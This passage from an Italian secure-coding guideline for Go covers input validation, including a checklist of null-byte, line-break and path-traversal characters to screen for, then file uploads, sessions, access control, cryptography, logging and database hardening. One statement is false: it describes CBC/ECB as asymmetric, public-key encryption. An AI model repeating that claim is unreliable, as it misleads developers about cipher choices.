o Verificare i Null Bytes: ( %00)  
o Verificare i caratteri di linea: %0d , %0a , \r , \n  
o Verificare i caratteri di alterazione del percorso ../ oppure \\..  
NOTA: Assicurarsi che le intestazioni di richiesta e risposta HTTP contengano solo caratteri ASCII . 
 
 
Linee guida per lo sviluppo sicuro Pag. 152  a 156  
 
7.12.3.2  Gestione dei File 
Assicurarsi che gli utenti non siano autorizzati a fornire direttamente dati a tutte le funzioni dinam iche. In 
linguaggi come PHP, il passaggio di dati utente a f unzioni incluse dinamicamente nel codice funzioni è  un 
grave rischio di sicurezza.  
Nel caso di reindirizzamenti dinamici, i dati utent e non devono essere passati. Se è richiesto 
dall'applicazione, è necessario adottare ulteriori controlli, che includono ad esempio: l'accettazione  solo dei 
dati correttamente convalidati e dei relativi URL. Inoltre, è importante assicurarsi che i percorsi a directory 
e file siano mappati in elenchi di indici di percor si predefiniti (assicurarsi di utilizzare tali indi ci).  
Non inviare mai il percorso assoluto del file, util izzare sempre percorsi relativi. 
Per i file e le risorse dell'applicazione, impostar e autorizzazioni di sola lettura. 
L’upload dei file sul server dovrebbe essere limita to ai soli utenti autenticati e solo per alcune tip ologie di 
file accettati. Questo controllo può essere fatto u sando la seguente funzione Go che rileva i tipi MIM E: func 
DetectContentType (data[] byte) string. I file cari cati dagli utenti non devono essere memorizzati nel  
contesto web dell'applicazione, ma in un server di contenuti o in un database. Il percorso su file sys tm in cui 
vengono memorizzati tali file non deve avere privil egi di esecuzione. Se il file server che ospita i d ati caricati 
dall’utente è basato su *NIX, è necessario implemen tare meccanismi di sicurezza come l'ambiente chroot ed 
o montare la directory del file di destinazione com e un'unità logica.      
7.12.3.2.1  Sorgenti dati 
Ogni volta che i dati vengono trasmessi da una font e attendibile a una fonte meno attendibile, è neces sario 
eseguire controlli di integrità. Ciò garantisce che  i dati non siano stati manomessi e che si stanno r icevendo 
i dati previsti. Altri controlli includono: 
• Cross-system consistency checks; 
• Hash totals; 
• Referential integrity; 
• Uniqueness check; 
• Table look up check. 
7.12.3.2.2  Azioni di post-validazione (azioni aggiuntive) 
• informare l'utente che i dati inseriti non rispetta no i requisiti richiesti e pertanto devono essere 
modificati per conformarli alle condizioni richiest e; 
• modificare i dati inviati dall'utente lato server s enza notificare all'utente di tali modifiche. 
7.12.3.2.3  Sanitizzazione 
Dopo aver effettuato i controlli di convalida appro priati, un ulteriore passaggio che viene in genere 
adottato per rafforzare la sicurezza dei dati consi ste nel rimuovere o modificare i caratteri ritenuti  
‘pericolosi’. Le azioni più comuni di sanitizzazion e sono i seguenti: 
• Escaping. Nel package nativo html ci sono due funzi oni usate per la sanitizzazione: una per l'escape 
del testo HTML e un'altra per l'HTML senza escape. La funzione EscapeString(), accetta una stringa 
e restituisce la stessa stringa con i caratteri spe ciali convertiti. (es. ‘<’ viene sostituito con ‘&l t;’). 
Questa funzione converte solo i seguenti cinque car atteri: <,>, &, ' e ". Viceversa c'è anche la 
funzione UnescapeString () per convertire da entità  a caratteri. 
• Rimuovere i TAG. Sebbene il package html/template a bbia una funzione stripTags (), questa non è 
esportabile. Poiché nessun altro package nativo ha una funzione capace di rimuovere tutti i tag, 
l’alternativa è quella di utilizzare librerie di te rze parti o copiare l'intera funzione insieme alle sue 
classi e funzioni private. Alcuni esempi di libreri e di terze parti sono: 
o https://github.com/kennygrant/sanitize 
o Il pacchetto sanitize fornisce funzioni per la sani ficazione di codice HTML e dei percorsi.  
o https://github.com/maxwells/sanitize 
o Una libreria per la sanificazione di HTML che sfrut ti una white list. Semplice da usare. 
o https://github.com/microcosm-cc/bluemonday 
 
 
Linee guida per lo sviluppo sicuro Pag. 153  a 156  
 
o Bonifica codice HTML. 
• Rimuovere le interruzioni di linea, i caratteri di tabulazione (tab), gli spazi bianchi non necessari.  Il 
“text/template” e “html/template” includono un modo  per rimuovere gli spazi bianchi dal 
template, utilizzando un segno meno - all'interno d el delimitatore dell'azione. 
• URL Request Path. Nel pacchetto “net/http” c'è un t ipo di multiplexer di richiesta HTTP chiamato 
ServeMux, che viene utilizzato per far corrisponder e la richiesta in arrivo ai pattern registrati e 
quindi a invocare il gestore che più si avvicina al l' URL richiesto. Oltre al suo scopo principale, si  
occupa anche di sanitizzare l’URL, reindirizzando q ualsiasi richiesta contenente ‘.’ o ‘..’ o ‘/’ ripe tuti 
a un URL equivalente, ma più pulito. Di seguito un  esempio di Mux: 
func main() {  
mux := http.NewServeMux() 
rh := http.RedirectHandler( "http://yourDomain.org" , 307 )  
mux.Handle( "/login" , rh) 
log.Println( "Listening..." )  
http.ListenAndServe( ":3000" , mux)  
} 
7.12.3.3  Gestione Sessione, Controlli Accessi e Crittografia  
7.12.3.3.1  Sessioni 
• La creazione della sessione deve essere eseguita su  un sistema attendibile. 
• Assicurarsi che gli algoritmi utilizzati per genera re l’identificatore di sessione siano sufficienteme nte 
casuali al fine di prevenire una forzatura bruta di  sessione. 
• Una volta assicurato un token sufficientemente fort e, impostare l’opportuno valore per i cookie: 
‘Domain’, ‘Path’, ‘Expires’, ‘HttpOnly’ e ‘Securè. 
• Al momento del login, deve essere sempre generata u na nuova sessione. La vecchia sessione non 
deve essere mai riutilizzata, anche se non è scadut a. Utilizzare anche il parametro “Expire” per 
eseguire la chiusura della sessione in modo da prev enire il “session hijacking”. Un altro aspetto 
importante dei cookie è quello di impedire l'access o simultaneo per lo stesso nome utente. Ciò può 
essere fatto mantenendo un elenco degli utenti conn essi e confrontare il nuovo nome utente di 
accesso con tale elenco. Questo elenco di utenti at tivi viene di solito persistito su un database. 
• Gli identificatori di sessione non devono mai esser e esposti negli URL. Questi dovrebbero essere 
localizzabili solo nei cookie presenti nell'intesta zione http. Un esempio di cattiva pratica è quello di 
passare gli identificatori di sessione come paramet ri della GET. I dati della sessione devono inoltre 
essere protetti dall'accesso non autorizzato da par te di altri utenti del server.  
• È necessario passare da HTTP a HTTPS, al fine di pr evenire potenziali attacchi Man In The Middle 
(MITM), nei quali un attaccante si frappone fra due  endpoint, “fiutando” i pacchetti in transito. In 
tal modo tutto il traffico è visibile e comprensibi le, poiché l’HTTP prevede la trasmissione delle 
informazioni in chiaro. Utilizzando HTTPS in tutte le richieste (pacchetto “crypto/tls” di Go) la 
trasmissione risulta crittografata e il compito per  l’attaccante molto più arduo.  
• In caso di operazioni altamente sensibili o critich e, il token deve essere generato per richiesta 
invece che per sessione. Accertarsi sempre che il t oken sia sufficientemente casuale sia 
sufficientemente lungo da proteggerlo contro possib ili attacchi di forza bruta. 
• Aspetto da considerare nella gestione delle session i è la funzionalità Logout. L'applicazione deve 
fornire un modo per disconnettersi da tutte le pagi ne che richiedono l'autenticazione, nonché 
terminare completamente la sessione e le connession e ad esse associate. In particolare, quando un 
utente si disconnette, il cookie deve essere elimin ato dal client. La stessa azione deve essere 
intrapresa dalla componente che si occupa della mem orizzazione delle informazioni della sessione 
utente. 
7.12.3.3.2  Controllo Accessi 
 
 
 
Linee guida per lo sviluppo sicuro Pag. 154  a 156  
 
• Utilizzare solo gli oggetti di sistema attendibili per le decisioni di autorizzazione all'accesso. 
• Generare un token di sessione lato server, quindi m emorizzare e utilizzare questo token per 
convalidare l'utente e applicare il modello predefi nito di controllo degli accessi. 
• Il componente utilizzato per l'autorizzazione di ac cesso deve essere un unico componente 
(centralizzazione), utilizzato a livello di sito. C iò include quelle funzioni di libreria utilizzate c he 
chiamano servizi di autorizzazione esterni. 
• In caso di eccezione, il controllo degli accessi do vrebbe fallire in modo sicuro. A tale scopo è 
opportuno utilizzare la funzione 'Defer'. 
• Se l'applicazione non può accedere alle informazion i di configurazione, ogni accesso all'applicazione 
deve essere negato. 
• I controlli di autorizzazione devono essere applica ti su ogni richiesta, inclusi gli script eseguiti l ato 
server e le richieste provenienti da tecnologie lat o client come AJAX o Flash. 
• È importante separare correttamente la logica di ge stione dei privilegi dal resto del codice 
applicativo. 
• Altre operazioni importanti in cui i controlli di a ccesso devono essere attuati al fine di impedire ad  
un utente non autorizzato di accedervi, sono: 
o File e altre risorse, 
o Protezione URL’s, 
o Protezioni Funzioni, 
o Riferimenti diretti ad oggetti, 
o Servizi, 
o Dati applicativi, 
o Attributi utente e dati e informaizoni sulle policy . 
• Se i dati di stato devono essere memorizzati lato c lient, è necessario utilizzare la crittografia ed 
effettuare opportuni controlli d'integrità per prev enire possibili manomissioni. 
• Il flusso della logica applicativa deve essere conf orme alle regole di business. 
• Quando si trattano transazioni, il numero di transa zioni che un singolo utente o dispositivo può 
eseguire in un dato periodo di tempo deve essere su periore ai requisiti previsti, ma 
sufficientemente basso da impedire all'utente di es eguire un attacco di tipo DoS. 
• L'impiego della sola intestazione HTTP "referer" è insufficiente per convalidare l'autorizzazione e 
deve essere utilizzato solo come controllo suppleme ntare. 
• Per le sessioni con autenticazione a lungo termine,  l'applicazione deve riesaminare periodicamente 
l'autorizzazione dell'utente per verificare che i p ermessi di quest'ultimo non siano cambiati. Se le 
autorizzazioni sono cambiate, è necessario scollega re l'utente e costringerlo a riautenticarsi. 
• Gli account degli utenti devono essere verificati p eriodicamente, al fine di rispettare le procedure d i 
sicurezza, (ad esempio, disabilitando l'account ute nte dopo 30 giorni dalla data di scadenza della 
password). 
• L'applicazione deve supportare la possibilità di di sabilitare gli account e la chiusura delle sessioni  in 
caso di revoca dell'autorizzazione dell'utente, (ad  es. cambiamento di ruolo, situazione 
occupazionale, ecc.). 
• Gli account di servizio esterno, o che supportano c onnessioni da o verso sistemi esterni, devono 
essere dotati del  più basso possibile livello di p rivilegi. 
7.12.3.3.3  Crittografia e Hashing 
La crittografia deve essere utilizzata ogni qual vo lta è necessario comunicare o memorizzare dati sens ibili. 
Le regole da seguire sono le seguenti: 
• Utilizzare algoritmi sicuri di hashing come l’SHA-2 56. 
• Un caso di utilizzo "semplice" di crittografia è il  protocollo HTTPS - Hyper Text Transfer Protocol 
Secure.  
• AES è lo standard di fatto per quanto riguarda la c rittografia a chiave simmetrica. Questo algoritmo, 
come molte altre cifrature simmetriche, può essere implementato in diverse modalità.  
 
 
Linee guida per lo sviluppo sicuro Pag. 155  a 156  
 
• Utilizzare GCM (Galois Counter Mode) piuttosto che CBC/ECB. GCM è una modalità di cifratura 
autenticata, il che significa che dopo la fase di c rittografia viene aggiunto un tag di autenticazione  al 
testo cifrato, che sarà quindi convalidato prima de lla decodifica dei messaggi, assicurando il 
messaggio da eventuali manomissioni. CBC/ECB, invec e, è una crittografia a chiave pubblica o 
asimmetrica, che utilizza coppie di chiavi: pubblic he e private. La crittografia a chiave pubblica è 
meno performante della crittografia a chiave simmet rica per la maggior parte dei casi, per cui il suo 
uso più comune è la condivisione di una chiave simm etrica tra due parti usando la crittografia 
asimmetrica, in modo da poter utilizzare la chiave simmetrica per scambiare messaggi crittografati 
con crittografia simmetrica. A parte AES, che è una  tecnologia degli anni' 90, gli autori di Go hanno 
iniziato ad implementare e supportare algoritmi di crittografia simmetrica più moderni che 
forniscono anche l'autenticazione, come "chacha20po ly1305". 
• Un altro package da considerare in Go, invece dell’ uso diretto di AES, è “x/crypto/nacl”. La 
“nacl/box” e “nacl/secretbox” in Go sono implementa zioni delle astrazioni di NaCl per l'invio di 
messaggi crittografati per i due casi di utilizzo p iù comuni: 
o Invio di messaggi autenticati e crittografati tra d ue parti utilizzando la crittografia a chiave 
pubblica (nacl/box). 
o Invio di messaggi autenticati e crittografati tra d ue parti usando la crittografia simmetrica 
(a.k.a secret-key). 
• Si deve stabilire e utilizzare una politica e un pr ocesso per la gestione delle chiavi crittografiche,  in 
modo tale da proteggere i dati principali più sensi bili dall'accesso non autorizzato. Pertanto, le 
chiavi crittografiche non devono essere assolutamen te esplicitate, né tanto meno codificate nel 
sorgente (hard coded). 
• Focalizzare l'attenzione sull'impiego di algoritmi crittografici più moderni come l'implementazione 
"https://godoc.org/golang.org/x/crypto" piuttosto c he utilizzare il pacchetto "crypto/*". 
• Tutti i numeri casuali, nomi di file casuali, GUID casuali e stringhe casuali generati applicativament e, 
devono essere creati utilizzando un generatore di n umeri casuali approvato dal modulo 
crittografico, soprattutto quando questi valori son o potenzialmente sensibili e soggetti ad essere 
indovinati. Utilizzare dunque la "crypto/rand" che,  anche se più lenta della "math/rand", risulta 
essere molto più sicura. 
7.12.3.4  Gestione degli Errori e delle Eccezioni 
La gestione degli errori e il logging rappresentano  una parte essenziale nella protezione dell'applica zione e 
dell'infrastruttura. Quando si parla di gestione de gli errori, ci si riferisce all’individuazione di e ventuali errori 
nella logica dell'applicazione che potrebbero causa re il blocco del sistema, a meno che non vengano ge stiti 
correttamente.  
In Go esistono funzioni per la gestione degli error i. Queste sono: il panic, recover e il defer. Quand o uno 
stato di applicazione è panic , l'esecuzione normale viene interrotta, le dichiar azioni di defer  vengono 
eseguite e la funzione torna al suo chiamante. Recover  di solito è utilizzato all'interno delle dichiaraz ioni di 
defer  e consente all'applicazione di riacquistare il con trollo su una routine di panicking e di tornare all a 
normale esecuzione. 
D'altra parte, il logging dettagliato di tutte le o perazioni e delle richieste che si sono verificate nel sistema 
aiuta a determinare quali azioni devono essere adot tate per proteggere il sistema. Poiché gli aggresso ri 
tentano di eliminare tutte le tracce delle loro azi oni cancellando i log, è fondamentale che i file di  log siano 
centralizzati e protetti da accessi non autorizzati . 
Altre azioni: 
• gli sviluppatori devono assicurarsi che non siano d ivulgate informazioni sensibili nelle risposte di 
errore, nonché garantire che nessun gestore di erro ri rilasci informazioni (ad esempio, il debug o le 
informazioni sulle tracce di stack).  
• Il logging deve essere sempre gestito dall'applicaz ione e non deve basarsi sulla configurazione del 
server. Tutte le registrazioni devono essere implem entate da una routine master su un sistema 
affidabile e gli sviluppatori devono inoltre assicu rarsi che i dati sensibili non siano soggetti a log ging 
 
 
Linee guida per lo sviluppo sicuro Pag. 156  a 156  
 
(ad es. Password, informazioni sulla sessione, dett agli di sistema, ecc.) né che ci siano informazioni  
di tracciamento di debug o stack. Inoltre, la regis trazione dovrebbe coprire sia eventi di successo 
che di insuccesso in materia di sicurezza. 
 
Il package nativo di Go che contiene le funzioni di  logging non supporta livelli distinti di verbosità , il che 
significa che tale feature deve essere implementata  a parte. Un altro problema con il logger nativo è che 
non c'è modo di attivare o disattivare il logging p er package. Poiché normalmente sono richieste 
funzionalità di logging adeguate per la manutenzion e e la sicurezza, a tal fine, si utilizza una libre ria di 
registrazione di terze parti come ad esempio: 
• Logrus  - https://github.com/Sirupsen/logrus 
• glog  - https://github.com/golang/glog 
• loggo  - https://github.com/juju/loggo 
Tra queste librerie, la più usata è “ Logrus ”. Glog non più aggiornata da qualche anno. 
Per garantire la validità e l'integrità dei log, de ve essere utilizzata come passo aggiuntivo una funz ione di 
hash crittografica al fine di prevenire possibili m anomissioni dei log. 
7.12.3.5  Sicurezza del Database 
Installazione sicura del server di database: 
• Modificare / impostare una password per account di root; 
• Rimuovere gli accounts “root” che sono accessibili dall'esterno di localhost; 
• Rimuovere eventuali account anonimi; 
• Rimuovere qualsiasi database di prova esistente; 
• Rimuovere eventuali stored procedure non necessarie , pacchetti di utilità, servizi inutili, contenuti 
del fornitore (ad es. Schemi di esempio). 
• Installare il set minimo di funzionalità e opzioni necessarie per il database, per funzionare con Go. 
• Disattivare tutti gli account predefiniti che non s ono richiesti nell'applicazione Web per connettersi  
al database. 
